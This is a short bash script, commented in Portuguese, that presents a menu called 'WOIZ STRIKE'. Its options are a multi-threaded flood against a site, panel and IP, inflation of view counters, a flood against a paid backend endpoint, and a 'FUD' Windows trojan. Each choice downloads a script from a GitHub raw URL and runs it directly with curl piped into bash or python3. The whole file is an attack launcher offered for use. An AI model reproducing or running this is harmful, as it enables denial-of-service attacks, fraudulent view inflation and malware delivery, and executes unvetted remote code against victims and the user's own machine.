#!/usr/bin/env bash
# WOIZ STRIKE MENU - 1 comando, escolhe numero e ja ataca
RAW="https://raw.githubusercontent.com/Hhhaofuqoc/woiz-strike/main"
echo "=============================="
echo "      W O I Z  S T R I K E"
echo "=============================="
echo " [1] FLOOD SITE+PAINEL+IP (800 threads)"
echo " [2] CONTADOR INFLACAO (visualizacoes)"
echo " [3] FLOOD BACKEND EXPRESS (POST pago)"
echo " [4] TROJAN FUD (windows)"
echo " [0] SAIR"
echo -n "digite o numero: "
read OP 2>/dev/tty || read OP
if [ "$OP" = "1" ]; then curl -skL $RAW/woiz_strike.sh | bash
elif [ "$OP" = "2" ]; then curl -skL $RAW/views_inflate.py | python3 - 20
elif [ "$OP" = "3" ]; then curl -skL $RAW/backend_trace.py | python3 - 15
elif [ "$OP" = "4" ]; then curl -skL $RAW/woiz_fud.py -o woiz_fud.py && python3 woiz_fud.py
else echo "saindo..."; exit 0
fi
